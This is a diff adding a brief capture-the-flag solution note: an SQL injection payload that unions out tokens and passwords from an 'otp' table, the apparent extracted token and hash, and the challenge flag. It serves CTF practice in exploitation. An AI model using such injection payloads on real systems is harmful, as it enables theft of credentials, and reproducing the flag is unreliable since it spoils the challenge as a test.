@@ -1,0 +1,5 @@
+' union all select token||':'||pass from (with tmp(token,pass,expire) as (select * from otp) select * from tmp order by expire desc)--
+
+1f385239b3732cba:57919703b92670aa6d9c26bd6dd9798f
+
+ADCTF_all_Y0ur_5CH3ma_ar3_83L0N9_t0_u5
